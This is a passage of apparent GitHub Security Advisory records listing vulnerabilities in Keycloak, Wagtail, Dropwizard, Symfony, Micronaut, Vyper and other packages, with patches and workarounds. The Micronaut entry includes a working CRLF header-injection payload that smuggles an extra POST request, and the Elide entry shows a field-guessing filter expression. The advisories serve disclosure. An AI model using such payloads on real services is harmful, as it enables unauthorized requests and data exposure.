    "description": "### Impact\n_What kind of vulnerability is it? Who is impacted?_\n\nIf you're running a vulnerable application on your computer and an attacker can trick you into visiting a malicious website, they could use [DNS rebinding](https://en.wikipedia.org/wiki/DNS_rebinding) and [CSRF](https://en.wikipedia.org/wiki/Cross-site_request_forgery) attacks to read/write to vulnerable applications. \n\n**There is no evidence that suggests that this has been used in the wild.**\n\n### Patches\n_Has the problem been patched? What versions should users upgrade to?_\n\nYes, 2.15.0.\n\n### Workarounds\n_Is there a way for users to fix or remediate the vulnerability without upgrading?_\n\nNo.\n\n### References\n_Are there any links users can visit to find out more?_\n\nNo.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [fraction/oasis](http://github.com/fraction/oasis)\n* Email me at [christianbundy@fraction.io](mailto:christianbundy@fraction.io)",
    "summary": "CSRF and DNS Rebinding in Oasis"
  },
  {
    "ghsaId": "GHSA-3gg7-9q2x-79fc",
    "publishedAt": "2020-04-15T21:09:40Z",
    "description": "A vulnerability was found in all versions of Keycloak where, the pages on the Admin Console area of the application are completely missing general HTTP security headers in HTTP-responses. This does not directly lead to a security issue, yet it might aid attackers in their efforts to exploit other problems. The flaws unnecessarily make the servers more prone to Clickjacking, channel downgrade attacks and other similar client-based attack vectors.",
    "summary": "Improper Restriction of Rendered UI Layers or Frames in Keycloak"
  },
  {
    "ghsaId": "GHSA-6pmv-7pr9-cgrj",
    "publishedAt": "2020-04-15T21:09:27Z",
    "description": "A flaw was found in all versions of the Keycloak operator, before version 8.0.2,(community only) where the operator generates a random admin password when installing Keycloak, however the password remains the same when deployed to the same OpenShift namespace.",
    "summary": "Predictable password in Keycloak"
  },
  {
    "ghsaId": "GHSA-8vf3-4w62-m3pq",
    "publishedAt": "2020-04-15T21:09:09Z",
    "description": "It was found in all keycloak versions before 9.0.0 that links to external applications (Application Links) in the admin console are not validated properly and could allow Stored XSS attacks. An authed malicious user could create URLs to trick users in other realms, and possibly conduct further attacks.",
    "summary": "XSS in Keycloak"
  },
  {
    "ghsaId": "GHSA-xfqh-7356-vqjj",
    "publishedAt": "2020-04-15T21:08:21Z",
    "description": "It was found that keycloak before version 8.0.0 exposes internal adapter endpoints in org.keycloak.constants.AdapterConstants, which can be invoked via a specially-crafted URL. This vulnerability could allow an attacker to access unauthorized information.",
    "summary": "Exposure of Sensitive Information to an Unauthorized Actor in Keycloak"
  },
  {
    "ghsaId": "GHSA-rc5r-697f-28x6",
    "publishedAt": "2020-04-15T21:07:59Z",
    "description": "Grid component of Sylius omits HTML input sanitisation while rendering object implementing __toString() method through the string field type.",
    "summary": "XSS injection in the Grid component of Sylius"
  },
  {
    "ghsaId": "GHSA-v2wc-pfq2-5cm6",
    "publishedAt": "2020-04-14T23:09:29Z",
    "description": "### Impact\nA cross-site scripting (XSS) vulnerability exists on the page revision comparison view within the Wagtail admin interface. A user with a limited-permission editor account for the Wagtail admin could potentially craft a page revision history that, when viewed by a user with higher privileges, could perform actions with that user's credentials. The vulnerability is not exploitable by an ordinary site visitor without access to the Wagtail admin.\n\n### Patches\nPatched versions have been released as Wagtail 2.7.2 (for the LTS 2.7 branch) and Wagtail 2.8.1 (for the current 2.8 branch).\n\n### Workarounds\nSite owners who are unable to upgrade to the new versions can disable the revision comparison view by adding the following URL route to the top of their project's `urls.py` configuration:\n\n    from django.views.generic.base import RedirectView\n\n    urlpatterns = [\n        url(r'^admin/pages/(\\d+)/revisions/compare/', RedirectView.as_view(url='/admin/')),\n        # ...\n    ]\n\n### Acknowledgements\nMany thanks to Vlad Gerasimenko for reporting this issue.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Visit Wagtail's [support channels](https://docs.wagtail.io/en/stable/support.html)\n* Email us at [security@wagtail.io](mailto:security@wagtail.io) (if you wish to send encrypted email, the public key ID is `0x6ba1e1a86e0f8ce8`)",
    "summary": "Possible XSS attack in Wagtail"
  },
  {
    "ghsaId": "GHSA-wvpv-ffcv-r6cw",
    "publishedAt": "2020-04-14T23:09:13Z",
    "description": "### Impact\nEvery user of the library before version 1.0.4.\n\n### Patches\nPatched in 1.0.4+.\n\n### Workarounds\nNone.\n\n### References\nhttps://github.com/SeppPenner/WindowsHello/issues/3\n\n### For more information\nIt this library is used to encrypt text and write the output to a txt file, another executable could be able to decrypt the text using the static method NCryptDecrypt from this same library  without the need to use Windows Hello Authentication again.",
    "summary": "Internal NCryptDecrypt method could be used externally from WindowsHello library."
  },
  {
    "ghsaId": "GHSA-4gp3-p7ph-x2jr",
    "publishedAt": "2020-04-14T23:09:00Z",
    "description": "devcert-sanscache before 0.4.7 allows remote attackers to execute arbitrary code or cause a Command Injection via the exec function. The variable `commonName` controlled by user input is used as part of the `exec` function without any sanitization.",
    "summary": "OS Command Injection in devcert-sanscache"
  },
  {
    "ghsaId": "GHSA-3944-787c-f852",
    "publishedAt": "2020-04-14T15:27:21Z",
    "description": "Sonatype Nexus Repository before 3.21.2 allows XSS.",
    "summary": "Persistent Cross-Site scripting in Nexus Repository Manager"
  },
  {
    "ghsaId": "GHSA-8h56-v53h-5hhj",
    "publishedAt": "2020-04-14T15:27:14Z",
    "description": "Sonatype Nexus Repository before 3.21.2 allows Remote Code Execution.",
    "summary": "Remote Code Execution - JavaEL Injection (low privileged accounts) in Nexus Repository Manager"
  },
  {
    "ghsaId": "GHSA-g2f6-v5qh-h2mq",
    "publishedAt": "2020-04-14T15:27:05Z",
    "description": "Sonatype Nexus Repository before 3.21.2 allows JavaEL Injection (issue 1 of 2).",
    "summary": "Nexus Repository Manager 3 - Remote Code Execution "
  },
  {
    "ghsaId": "GHSA-8jpx-m2wh-2v34",
    "publishedAt": "2020-04-10T18:42:20Z",
    "description": "### Summary\n\nA server-side template injection was identified in the self-validating ([`@SelfValidating`](https://javadoc.io/static/io.dropwizard/dropwizard-project/2.0.3/io/dropwizard/validation/selfvalidating/SelfValidating.html)) feature of **dropwizard-validation** enabling attackers to inject arbitrary Java EL expressions, leading to Remote Code Execution (RCE) vulnerability.\n\nIf you're using a self-validating bean (via [`@SelfValidating`](https://javadoc.io/static/io.dropwizard/dropwizard-project/2.0.3/io/dropwizard/validation/selfvalidating/SelfValidating.html)), an upgrade to Dropwizard 1.3.21/2.0.3 or later is strongly recommended.\n\nThe changes introduced in Dropwizard 1.3.19 and 2.0.2 (see [GHSA-3mcp-9wr4-cjqf](https://github.com/dropwizard/dropwizard/security/advisories/GHSA-3mcp-9wr4-cjqf)/[CVE-2020-5245](https://github.com/advisories/GHSA-3mcp-9wr4-cjqf)) unfortunately didn't fix the underlying issue completely.\n\n### Impact\n\nThis issue may allow Remote Code Execution (RCE), allowing to run arbitrary code on the host system (with the privileges of the Dropwizard service account privileges) by injecting arbitrary [Java Expression Language (EL)](https://docs.jboss.org/hibernate/validator/6.1/reference/en-US/html_single/#section-interpolation-with-message-expressions) expressions when using the self-validating feature ([`@SelfValidating`](https://javadoc.io/static/io.dropwizard/dropwizard-project/2.0.3/io/dropwizard/validation/selfvalidating/SelfValidating.html), [`@SelfValidation`](https://javadoc.io/static/io.dropwizard/dropwizard-project/2.0.3/io/dropwizard/validation/selfvalidating/SelfValidation.html)) in **dropwizard-validation**.\n\n### Patches\n\nThe issue has been fixed in **dropwizard-validation** **1.3.21** and **2.0.3** or later. We strongly recommend upgrading to one of these versions.\n\nThe evaluation of EL expressions has been disabled by default now.\n\nIn order to use some interpolation in the violation messages added to [`ViolationCollector`](https://javadoc.io/static/io.dropwizard/dropwizard-project/2.0.3/io/dropwizard/validation/selfvalidating/ViolationCollector.html), it has to be explicitly allowed by setting [`SelfValidating#escapeExpressions()`](https://javadoc.io/static/io.dropwizard/dropwizard-project/2.0.3/io/dropwizard/validation/selfvalidating/SelfValidating.html#escapeExpressions--) to `false`.\n\nIt is also recommended to use the `addViolation` methods supporting message parameters instead of EL expressions introduced in Dropwizard 1.3.21 and 2.0.3:\n* [`ViolationCollector#addViolation(String, Map<String, Object>`](https://javadoc.io/static/io.dropwizard/dropwizard-project/2.0.3/io/dropwizard/validation/selfvalidating/ViolationCollector.html#addViolation-java.lang.String-java.util.Map-)\n* [`ViolationCollector#addViolation(String, String, Map<String, Object>`](https://javadoc.io/static/io.dropwizard/dropwizard-project/2.0.3/io/dropwizard/validation/selfvalidating/ViolationCollector.html#addViolation-java.lang.String-java.lang.String-java.util.Map-)\n* [`ViolationCollector#addViolation(String, String, Integer, Map<String, Object>`](https://javadoc.io/static/io.dropwizard/dropwizard-project/2.0.3/io/dropwizard/validation/selfvalidating/ViolationCollector.html#addViolation-java.lang.String-java.lang.Integer-java.lang.String-java.util.Map-)\n* [`ViolationCollector#addViolation(String, String, String, Map<String, Object>`](https://javadoc.io/static/io.dropwizard/dropwizard-project/2.0.3/io/dropwizard/validation/selfvalidating/ViolationCollector.html#addViolation-java.lang.String-java.lang.String-java.lang.String-java.util.Map-)\n\n\n### Workarounds\n\nIf you are not able to upgrade to one of the aforementioned versions of **dropwizard-validation** but still want to use the [`@SelfValidating`](https://javadoc.io/static/io.dropwizard/dropwizard-project/2.0.2/io/dropwizard/validation/selfvalidating/SelfValidating.html) feature, make sure to properly sanitize any message you're adding to the [`ViolationCollector`](https://javadoc.io/static/io.dropwizard/dropwizard-project/2.0.3/io/dropwizard/validation/selfvalidating/ViolationCollector.html) in the method annotated with [`@SelfValidation`](https://javadoc.io/static/io.dropwizard/dropwizard-project/2.0.3/io/dropwizard/validation/selfvalidating/SelfValidation.html).\n\nExample:\n```java\n@SelfValidation\npublic void validateFullName(ViolationCollector col) {\n    if (fullName.contains(\"_\")) {\n        // Sanitize fullName variable by escaping relevant characters such as \"$\"\n        col.addViolation(\"Full name contains invalid characters:  \" + sanitizeJavaEl(fullName));\n    }\n}\n```\n\nSee also:\nhttps://github.com/dropwizard/dropwizard/blob/v2.0.3/dropwizard-validation/src/main/java/io/dropwizard/validation/InterpolationHelper.java\n\n### References\n\n* https://github.com/dropwizard/dropwizard/security/advisories/GHSA-3mcp-9wr4-cjqf\n* https://github.com/dropwizard/dropwizard/pull/3208\n* https://github.com/dropwizard/dropwizard/pull/3209\n* https://docs.jboss.org/hibernate/validator/6.1/reference/en-US/html_single/#section-hibernateconstraintvalidatorcontext\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n* Open an issue in [dropwizard/dropwizard](https://github.com/dropwizard/dropwizard/issues/new)\n* Start a discussion on the [dropwizard-dev mailing list](https://groups.google.com/forum/#!forum/dropwizard-dev)\n\n### Security contact\n\nIf you want to responsibly disclose a security issue in Dropwizard or one of its official modules, please contact us via the published channels in our [security policy](https://github.com/dropwizard/dropwizard/security/policy):\n\nhttps://github.com/dropwizard/dropwizard/security/policy#reporting-a-vulnerability",
    "summary": "Remote Code Execution (RCE) vulnerability in dropwizard-validation"
  },
  {
    "ghsaId": "GHSA-prfq-f66g-43mp",
    "publishedAt": "2020-04-10T18:19:10Z",
    "description": "## Overview\nBetween versions 8.0.0 and  9.13.1(inclusive), in the case of an (authentication) error, the error object returned by the library contains the original request of the user, which may include the plaintext password the user entered. \n\nIf the error object is exposed or logged without modification, the application risks password exposure.\n\n## Am I affected?\nYou are affected by this vulnerability if all of the following conditions apply:\n\n- You are using Auth0.js version between 8.0.0 and 9.13.1(inclusive).\n- You store or display error objects without filtering. \n\n## How to fix that?\nDevelopers should upgrade auth0.js to version 9.13.2 or later where user inputted passwords are masked in errors. If upgrading is not possible, a temporary fix may include not storing the error object or displaying it publicly without modification.\n\n## Will this update impact my users?\n\nThis fix patches the Auth0.js and may require changes in application code due to password no longer available in error object, but it will not impact your users, their current state, or any existing sessions.",
    "summary": "Information disclosure through error object in auth0.js"
  },
  {
    "ghsaId": "GHSA-jgpq-g82g-6c39",
    "publishedAt": "2020-04-07T15:52:05Z",
    "description": "confinit through 0.3.0 is vulnerable to Prototype Pollution.The 'setDeepProperty' function could be tricked into adding or modifying properties of 'Object.prototype' using a '__proto__' payload.",
    "summary": "confinit vulnerable to prototype pollution"
  },
  {
    "ghsaId": "GHSA-6gp3-h3jj-prx4",
    "publishedAt": "2020-04-07T15:47:40Z",
    "description": "class-transformer through 0.2.3 is vulnerable to Prototype Pollution. The 'classToPlainFromExist' function could be tricked into adding or modifying properties of 'Object.prototype' using a '__proto__' payload.",
    "summary": "Prototype pollution in class-transformer"
  },
  {
    "ghsaId": "GHSA-6chw-6frg-f759",
    "publishedAt": "2020-04-03T21:48:38Z",
    "description": "Affected versions of acorn are vulnerable to Regular Expression Denial of Service.\nA regex in the form of /[x-\\ud800]/u causes the parser to enter an infinite loop.\nThe string is not valid UTF16 which usually results in it being sanitized before reaching the parser.\nIf an application processes untrusted input and passes it directly to acorn,\nattackers may leverage the vulnerability leading to Denial of Service.",
    "summary": "Regular Expression Denial of Service in Acorn"
  },
  {
    "ghsaId": "GHSA-vh95-rmgr-6w4m",
    "publishedAt": "2020-04-03T21:48:32Z",
    "description": "minimist before 1.2.2 could be tricked into adding or modifying properties of Object.prototype using a \"constructor\" or \"__proto__\" payload.",
    "summary": "Prototype pollution in minimist"
  },
  {
    "ghsaId": "GHSA-gv3v-92v6-m48j",
    "publishedAt": "2020-04-03T15:23:30Z",
    "description": "### Impact\n\n - Cross Site Scripting\n - Cache Poisoning\n - Page Hijacking\n\n### Patches\n\nThis was fixed in version `2.2.1`.\n\n### Workarounds\n\nIf you are unable to update, ensure that user supplied data isn't able to flow to HTTP headers. If it does, pre-sanitize for CRLF characters.\n\n### References\n\n##### [CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Response Splitting')](https://cwe.mitre.org/data/definitions/113.html)\n\nI've been poking at libraries to see if they are vulnerable to HTTP Response Splitting and Jooby is my third case of finding this vulnerability.\n\n### Root Cause\n\nThis roots cause back to this line in the Jooby codebase:\n\nhttps://github.com/jooby-project/jooby/blob/93cfc80aa20c188f71a442ea7a1827da380e1c27/modules/jooby-netty/src/main/java/io/jooby/internal/netty/NettyContext.java#L102\n\nThe `DefaultHttpHeaders` takes a parameter `validate` which, when `true` (as it is for the no-arg constructor) validates that the header isn't being abused to do HTTP Response Splitting.\n\n### Reported By\n\nThis vulnerability was reported by @JLLeitschuh ([Twitter](https://twitter.com/JLLeitschuh))\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [jooby-project/jooby](https://github.com/jooby-project/jooby/issues)",
    "summary": "Improper Neutralization of CRLF Sequences in HTTP Headers in Jooby ('HTTP Response Splitting)"
  },
  {
    "ghsaId": "GHSA-5gm3-px64-rw72",
    "publishedAt": "2020-04-01T16:36:44Z",
    "description": "There is a DoS vulnerability in Pillow before 6.2.2 caused by FpxImagePlugin.py calling the range function on an unvalidated 32-bit integer if the number of bands is large. On Windows running 32-bit Python, this results in an OverflowError or MemoryError due to the 2 GB limit. However, on Linux running 64-bit Python this results in the process being terminated by the OOM killer.",
    "summary": "Uncontrolled Resource Consumption in Pillow"
  },
  {
    "ghsaId": "GHSA-4g46-5grc-wq49",
    "publishedAt": "2020-04-01T16:36:31Z",
    "description": "The seeftl package v0.1.1 is vulnerable to a stored Cross-Site Scripting (XSS) vulnerability via a malicious filename rendered in a directory listing.",
    "summary": "XSS in seeftl"
  },
  {
    "ghsaId": "GHSA-gvr4-7xgc-gx3w",
    "publishedAt": "2020-04-01T16:36:15Z",
    "description": "The fileview package v0.1.6 has inadequate output encoding and escaping, which leads to a stored Cross-Site Scripting (XSS) vulnerability in files it serves.",
    "summary": "XSS in fileview"
  },
  {
    "ghsaId": "GHSA-hj69-c76v-86wr",
    "publishedAt": "2020-04-01T16:36:00Z",
    "description": "libImaging/FliDecode.c in Pillow before 6.2.2 has an FLI buffer overflow.",
    "summary": "Out-of-bounds Read in Pillow"
  },
  {
    "ghsaId": "GHSA-c2h6-7gm8-cv4w",
    "publishedAt": "2020-04-01T16:35:44Z",
    "description": "The OpenID Connect reference implementation for MITREid Connect through 1.3.3 allows XSS due to userInfoJson being included in the page unsanitized. This is related to header.tag. The issue can be exploited to execute arbitrary JavaScript.",
    "summary": "XSS in MITREid Connect"
  },
  {
    "ghsaId": "GHSA-8qxj-f9rh-9fg2",
    "publishedAt": "2020-04-01T16:35:26Z",
    "description": "A flaw was found in all python-ecdsa versions before 0.13.3, where it did not correctly verify whether signatures used DER encoding. Without this verification, a malformed signature could be accepted, making the signature malleable. Without proper verification, an attacker could use a malleable signature to create false transactions.",
    "summary": "Improper Verification of Cryptographic Signature in Pure-Python ECDSA"
  },
  {
    "ghsaId": "GHSA-9q64-mpxx-87fg",
    "publishedAt": "2020-04-01T16:35:08Z",
    "description": "ecstatic have a denial of service vulnerability. Successful exploitation could lead to crash of an application.",
    "summary": "Denial of Service in ecstatic"
  },
  {
    "ghsaId": "GHSA-vcjj-xf2r-mwvc",
    "publishedAt": "2020-04-01T15:47:45Z",
    "description": "There is a vulnerability in knockout before version 3.5.0-beta, where after escaping the context of the web application, the web application delivers data to its users along with other trusted dynamic content, without validating it.",
    "summary": "XSS in knockout"
  },
  {
    "ghsaId": "GHSA-754x-4jwp-cqp6",
    "publishedAt": "2020-03-31T17:02:26Z",
    "description": "A Path traversal exists in http_server which allows an attacker to read arbitrary system files.",
    "summary": "Path Traversal in http_server"
  },
  {
    "ghsaId": "GHSA-j27j-4w6m-8fc4",
    "publishedAt": "2020-03-31T17:02:12Z",
    "description": "A path traversal in statics-server exists in all version that allows an attacker to perform a path traversal when a symlink is used within the working directory.",
    "summary": "Path Traversal in statics-server"
  },
  {
    "ghsaId": "GHSA-6c8f-qphg-qjgp",
    "publishedAt": "2020-03-31T15:59:54Z",
    "description": "ctorName in index.js in kind-of v6.0.0 - v6.0.2 allows external user input to overwrite certain internal attributes via a conflicting name, as demonstrated by 'constructor': {'name':'Symbol'}. Hence, a crafted payload can overwrite this builtin attribute to manipulate the type detection result.",
    "summary": "Type checking vulnerability in kind-of"
  },
  {
    "ghsaId": "GHSA-h96w-mmrf-2h6v",
    "publishedAt": "2020-03-31T15:42:42Z",
    "description": "In Twisted Web through 19.10.0, there was an HTTP request splitting vulnerability. When presented with two content-length headers, it ignored the first header. When the second content-length value was set to zero, the request body was interpreted as a pipelined request.",
    "summary": "Improper Input Validation in Twisted"
  },
  {
    "ghsaId": "GHSA-p5xh-vx83-mxcj",
    "publishedAt": "2020-03-31T15:40:12Z",
    "description": "In Twisted Web through 19.10.0, there was an HTTP request splitting vulnerability. When presented with a content-length and a chunked encoding header, the content-length took precedence and the remainder of the request body was interpreted as a pipelined request.",
    "summary": "Improper Input Validation in Twisted"
  },
  {
    "ghsaId": "GHSA-694p-xrhg-x3wm",
    "publishedAt": "2020-03-30T20:54:55Z",
    "description": "### Vulnerability\n\nMicronaut's HTTP client is vulnerable to \"HTTP Request Header Injection\" due to not validating request headers passed to the client.\n\nExample of vulnerable code:\n\n```java\n@Controller(\"/hello\")\npublic class HelloController {\n\n    @Inject\n    @Client(\"/\")\n    RxHttpClient client;\n\n    @Get(\"/external-exploit\")\n    @Produces(MediaType.TEXT_PLAIN)\n    public String externalExploit(@QueryValue(\"header-value\") String headerValue) {\n        return client.toBlocking().retrieve(\n            HttpRequest.GET(\"/hello\")\n                .header(\"Test\", headerValue)\n        );\n    }\n}\n```\n\nIn the above case a query value received from a user is passed as a header value to the client. Since the client doesn't validate the header value the request headers and body have the potential to be manipulated.\n\nFor example, a user that supplies the following payload, can force the client to make multiple attacker-controlled HTTP requests.\n\n```java\nList<String> headerData = List.of(\n    \"Connection: Keep-Alive\", // This keeps the connection open so another request can be stuffed in.\n    \"\",\n    \"\",\n    \"POST /hello/super-secret HTTP/1.1\",\n    \"Host: 127.0.0.1\",\n    \"Content-Length: 31\",\n    \"\",\n    \"{\\\"new\\\":\\\"json\\\",\\\"content\\\":\\\"here\\\"}\",\n    \"\",\n    \"\"\n);\nString headerValue = \"H\\r\\n\" + String.join(\"\\r\\n\", headerData);;\nURI theURI =\n    UriBuilder\n        .of(\"/hello/external-exploit\")\n        .queryParam(\"header-value\", headerValue) // Automatically URL encodes data\n        .build();\nHttpRequest<String> request = HttpRequest.GET(theURI);\nString body = client.toBlocking().retrieve(request);\n```\n\nNote that using `@HeaderValue` instead of `@QueryValue` is not vulnerable since Micronaut's HTTP server does validate the headers passed to the server, so the exploit can only be triggered by using user data that is not an HTTP header (query values, form data etc.).\n\n### Impact\n\nThe attacker is able to control the entirety of the HTTP body for their custom requests.\nAs such, this vulnerability enables attackers to perform a variant of [Server Side Request Forgery](https://cwe.mitre.org/data/definitions/918.html).\n\n### Patches\n\nThe problem has been patched in the `micronaut-http-client` versions 1.2.10 and 1.3.1 and above.\n\n### Workarounds\n\nDo not pass user data directly received from HTTP request parameters as headers in the HTTP client.\n\n### References\n\nFix commits\n- https://github.com/micronaut-projects/micronaut-core/commit/9d1eff5c8df1d6cda1fe00ef046729b2a6abe7f1\n- https://github.com/micronaut-projects/micronaut-core/commit/6deb60b75517f80c57b42d935f07955c773b766d\n- https://github.com/micronaut-projects/micronaut-core/commit/bc855e439c4a5ced3d83195bb59d0679cbd95add\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n* Open an issue in [micronaut-core](https://github.com/micronaut-projects/micronaut-core)\n* Email us at [info@micronaut.io](mailto:info@micronaut.io)\n\n### Credit\n\nOriginally reported by @JLLeitschuh ",
    "summary": "CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Request Header Injection')"
  },
  {
    "ghsaId": "GHSA-fq77-7p7r-83rj",
    "publishedAt": "2020-03-30T20:40:50Z",
    "description": "### Impact\n\n- **Not affected**: Deployments on ZEIT Now v2 ([https://zeit.co](https://zeit.co/)) are not affected\n- **Not affected**: Deployments using the `serverless` target\n- **Not affected**: Deployments using `next export`\n- **Affected**: Users of Next.js below 9.3.2\n\nWe recommend everyone to upgrade regardless of whether you can reproduce the issue or not.\n\n### Patches\n\nhttps://github.com/zeit/next.js/releases/tag/v9.3.2\n\n### References\n\nhttps://github.com/zeit/next.js/releases/tag/v9.3.2",
    "summary": "Directory Traversal in Next.js"
  },
  {
    "ghsaId": "GHSA-2mxr-89gf-rc4v",
    "publishedAt": "2020-03-30T20:09:58Z",
    "description": "### Impact\nIt is possible for an adversary to \"guess and check\" the value of a model field they do not have access to assuming they can read at least one other field in the model.  The adversary can construct filter expressions for an inaccessible field to filter a collection.  The presence or absence of models in the returned collection can be used to reconstruct the value of the inaccessible field.\n\nFor example, a User model has two fields: _name_ and _role_.  The adversary has read permissions to see the _name_ field of the User collection but not the _role_.  By constructing a filter like the one below, the adversary can determine which users have admin role by presence or absence in the returned collection:\n`filter=role==\"Admin\"`\n\n### Patches\nResolved in Elide 4.5.14 and greater.\n\n### Workarounds\nThe adversary can only access the fields if a model includes fields with different read permission levels (some less secure and some more secure).  Model security can be adjusted by restricting read permissions on existing models.\n\n### References\nFixed in https://github.com/yahoo/elide/pull/1236\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [elide](https://github.com/yahoo/elide)\n* Contact us at [spectrum](https://spectrum.chat/elide?tab=posts)",
    "summary": "Read permissions not enforced for client provided filter expressions in Elide."
  },
  {
    "ghsaId": "GHSA-g4m9-5hpf-hx72",
    "publishedAt": "2020-03-30T20:09:44Z",
    "description": "Description\n-----------\n\nOn Symfony before 4.4.0, when a `Firewall` checks an access control rule (using the unanimous strategy), it iterates over all rule attributes and grant access only if *all* calls to the `accessDecisionManager` decide to grant access.\n\nAs of Symfony 4.4.0, a bug was introduced that prevents the check of attributes as soon as `accessDecisionManager` decide to grant access on one attribute.\n\nResolution\n----------\n\nThe `accessDecisionManager` is now called with all attributes at once, allowing the unanimous strategy being applied on each attribute. \n\nThe patch for this issue is available [here](https://github.com/symfony/symfony/commit/c935e4a3fba6cc2ab463a6ca382858068d63cebf) for the 4.4 branch.\n\nCredits\n-------\n\nI would like to thank Antonio J. García Lagar for reporting & Robin Chalas for fixing the issue.",
    "summary": "Firewall configured with unanimous strategy was not actually unanimous in Symfony"
  },
  {
    "ghsaId": "GHSA-m884-279h-32v2",
    "publishedAt": "2020-03-30T20:09:31Z",
    "description": "Description\n-----------\n\nWhen `ErrorHandler` renders an exception HTML page, it uses un-escaped properties from the related Exception class to render the stacktrace. The security issue comes from the fact that the stacktraces were also displayed in non-`debug` environments.\n\nResolution\n----------\n\nThe `ErrorHandler` class now escapes all properties coming from the related Exception, and the stacktrace is not displayed anymore in non-`debug` environments.\n\nThe patches for this issue are available [here](https://github.com/symfony/symfony/commit/cf80224589ac05402d4f72f5ddf80900ec94d5ad) and [here](https://github.com/symfony/symfony/commit/629d21b800a15dc649fb0ae9ed7cd9211e7e45db) for branch 4.4.\n\nCredits\n-------\n\nI would like to thank Luka Sikic for reporting & Yonel Ceruto and Jérémy Derussé for fixing the issue.",
    "summary": "Exceptions displayed in non-debug configurations in Symfony"
  },
  {
    "ghsaId": "GHSA-mcx4-f5f5-4859",
    "publishedAt": "2020-03-30T20:09:16Z",
    "description": "Description\n-----------\n\nWhen a `Response` does not contain a `Content-Type` header, Symfony falls back to the format defined in the `Accept` header of the request, leading to a possible mismatch between the response's content and `Content-Type` header. When the response is cached, this can lead to a corrupted cache where the cached format is not the right one.\n\nResolution\n----------\n\nSymfony does not use the `Accept` header anymore to guess the `Content-Type`.\n\nThe patch for this issue is available [here](https://github.com/symfony/symfony/commit/dca343442e6a954f96a2609e7b4e9c21ed6d74e6) for the 4.4 branch.\n\nCredits\n-------\n\nI would like to thank Xavier Lacot from JoliCode for reporting & Yonel Ceruto and Tobias Schultze for fixing the issue.",
    "summary": "Prevent cache poisoning via a Response Content-Type header in Symfony"
  },
  {
    "ghsaId": "GHSA-vqhp-cxgc-6wmm",
    "publishedAt": "2020-03-30T19:45:56Z",
    "description": "### Impact\n\n`bleach.clean` behavior parsing style attributes could result in a regular expression denial of service (ReDoS).\n\nCalls to ``bleach.clean`` with an allowed tag with an allowed ``style`` attribute are vulnerable to ReDoS. For example, ``bleach.clean(..., attributes={'a': ['style']})``.\n\n### Patches\n\n3.1.4\n\n### Workarounds\n\n* do not whitelist the style attribute in `bleach.clean` calls\n\n* limit input string length\n\n### References\n\n* https://bugzilla.mozilla.org/show_bug.cgi?id=1623633\n* https://www.regular-expressions.info/redos.html\n* https://blog.r2c.dev/posts/finding-python-redos-bugs-at-scale-using-dlint-and-r2c/\n* https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-6817\n\n### Credits\n\n* Reported by schwag09 of r2c\n\n### For more information\nIf you have any questions or comments about this advisory:\n\n* Open an issue at https://github.com/mozilla/bleach/issues\n* Email us at security@mozilla.org",
    "summary": "regular expression denial-of-service (ReDoS) in Bleach"
  },
  {
    "ghsaId": "GHSA-mr6r-mvw4-736g",
    "publishedAt": "2020-03-25T18:20:19Z",
    "description": "# VVE-2020-0001\n\nEarlier today, we received a responsible disclosure of a potential issue from @montyly (security researcher at @trailofbits) for Vyper users who make assumptions about what values certain interface types can return.\n\n### Impact\nWe determined the issue to be mild and unlikely to be exploited, with an easy workaround while the correct resolution is in process. The issue stems from a number of things, which we will detail here.\n\n(1) The ABI Specification is under-defined such that function return type is not always reflected in how you use it\n\nThis means that a function which returns `uint8` under the hood actually returns a 32 byte integer, making it identical to a function that returns `uint256`. This allows users to read an interface that returns a `uint8` value to be stored into a `uint256` variable without any explicit casting or input validation.\n\n(2) Vyper doesn&#39;t have `uint8` types\n\nWhen Vyper was originally created, it only had one numeric type, but we added just enough types to be able to work with the majority of ERC interfaces that exist.\n\nUnfortunately, we never added `uint8`, because it&#39;s only majority usage was for `ERC20.decimals()` as the return type, which isn&#39;t reflected in the method ID. Because of (1), it didn&#39;t matter that we didn&#39;t have these types implemented because you could capture the return value as `uint256` and use it just fine.\n\n(3) `ERC20.decimals()` returns `uint8`\n\n`ERC20.decimal()` (which is an optional function) returns a `uint8` type. While it was never intentioned to be used directly within a smart contract (hence being optional), someone could easily make the decision to rely on it to perform important functionality within their Vyper smart contract. This might lead to a scenario where an unexpectedly large value (&gt; 255) returned by calling this function (which a malicious contract writer might write) would allow an attacker to manipulate or bypass certain logic depending on this value.\n\nIn summary, because of (1), it isn&#39;t necessary to have to cast the return value of a function that returns `uint8` to `uint256`, and because of (2) it isn&#39;t possible to have the type system protect against this type of error. This could lead to scenarios like (3) where this behavior can be exploited.\n\n### Patches\nWe are currently refactoring our typing system so we can implement all ABI-compliant integer types, but no currently patched version is available that gives users access to the `uint8` type.\n\n### Workarounds\nThere is an easy workaround where you should check that the value returned by an interface which specifies `uint8` should be checked to be within the bounds of a `uint8` integer. As an example:\n\n```python\n...\n# returns uint8, but we implicitly cast to uint256 without checking\ndecimals: uint256 = ERC20(_token).decimal()\n# FIX: Insert this line\nassert decimals &lt; 256\n...\n```\n\nDepending on how you use this value, it may not be necessary to insert this check.\n\n### References\n* [ABI Specification](https://solidity.readthedocs.io/en/latest/abi-spec.html)\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Chat with us in [our gitter ](https://gitter.im/vyperlang/community)\n* Open an issue in [https://github.com/vyperlang/vyper](https://github.com/vyperlang/vyper)\n* Email us at [security@vyperlang.org](mailto:security@vyperlang.org)",
    "summary": "Vyper interfaces returning integer types less than 256 bits can be manipulated if uint256 is used"
  },
  {
    "ghsaId": "GHSA-66q9-f7ff-mmx6",
    "publishedAt": "2020-03-25T17:35:51Z",
